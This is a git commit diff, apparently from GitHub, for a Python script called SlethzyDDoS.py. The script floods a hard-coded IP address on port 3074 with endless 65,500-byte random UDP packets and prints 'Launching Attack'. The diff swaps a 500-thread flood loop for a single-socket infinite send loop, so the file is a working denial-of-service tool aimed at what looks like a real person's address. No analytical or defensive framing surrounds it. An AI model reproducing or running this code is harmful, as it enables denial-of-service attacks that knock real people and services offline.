1cc15aad2ba2faf6645df4f2917c345667da0e4d
Chase Hender <66840229+sFIsAnExpert@users.noreply.github.com>
2020-10-24 13:14:06 -1000

    Update SlethzyDDoS.py

--- SlethzyDDoS.py
+++ SlethzyDDoS.py
@@ -1,4 +1,3 @@
-  
 import sys
 import os
 import time
@@ -11,21 +10,13 @@ bytes = random._urandom(65500)
 ip = '98.155.64.207'
 port = 3074
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 time.sleep(5)
 print("Launching Attack")
 
-def attack():
-	while True:
-		sock.sendto(bytes, (ip,port))
-		sock.sendto(bytes, (ip,port))
-		sock.sendto(bytes, (ip,port))
-		sock.sendto(bytes, (ip,port))
-		sock.sendto(bytes, (ip,port))
-
-for i in range(500):
-		thread = threading.Thread(target=attack)
-		thread.setDaemon = True
-		thread.start()
-
-
+while True:
+	sock2.sendto(bytes, (ip,port))
+	sock2.sendto(bytes, (ip,port))
+	sock2.sendto(bytes, (ip,port))
+	sock2.sendto(bytes, (ip,port))
+	sock2.sendto(bytes, (ip,port))
